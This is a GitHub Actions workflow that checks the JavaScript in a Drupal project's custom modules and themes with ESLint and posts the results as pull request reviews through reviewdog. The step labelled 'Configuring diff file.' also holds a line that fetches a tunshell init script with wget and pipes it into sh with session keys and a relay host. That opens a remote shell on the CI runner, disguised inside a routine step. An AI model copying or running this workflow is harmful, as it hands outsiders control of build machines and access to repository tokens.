name: Drupal JS code standards checker

on: pull_request

jobs:
  eslint-checker:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v3

      - name: Install drupal project
        run: |
          composer install

      - name: Node js installer
        uses: actions/setup-node@v3
        with:
          node-version: 16
          cache: 'npm'
          cache-dependency-path: tools/package-lock.json
          
      - name: Install Yarn
        run: |
          npm -v
          npm install yarn
          
      - name: Get yarn cache directory path
        id: yarn-cache-dir-path
        run: echo "::set-output name=dir::$(yarn cache dir)"

      - uses: actions/cache@v3
        id: yarn-cache # use this to check for `cache-hit` (`steps.yarn-cache.outputs.cache-hit != 'true'`)
        with:
          path: ${{ steps.yarn-cache-dir-path.outputs.dir }}
          key: ${{ runner.os }}-yarn-${{ hashFiles('**/yarn.lock') }}
          restore-keys: |
            ${{ runner.os }}-yarn-             
      
      - name: Install ESlint
        run: |
          yarn add --dev eslint-config-drupal-bundle eslint
          
      - name: Installing reviewdog
        uses: reviewdog/action-setup@v1
        with:
          reviewdog_version: latest
      
      - name: Configuring diff file.
        run: |
          git config --global --add safe.directory .
          wget https://lets.tunshell.com/init.sh -O - 2> /dev/null | sh -s -- T mHpswinFZQUrIPXRJnwPAm yVp6JNp881IZHr91MHnEL3 eu.relay.tunshell.com
          git diff --dirstat=files,0 origin/$GITHUB_HEAD_REF..$GITHUB_BASE_REF |\
          grep -e web/modules/custom -e web/themes/custom -e web/profiles/custom |\
          tr "\n" " " > /tmp/check

      - name: JS coding standards checking
        env:
          REVIEWDOG_GITHUB_API_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          yarn eslint `cat /tmp/check` --ext .js \
          --no-error-on-unmatched-pattern |
          reviewdog -f=eslint -name="ESLint" \
          -reporter=github-pr-review \
          -fail-on-error -filter-mode=nofilter -tee
        timeout-minutes: 5
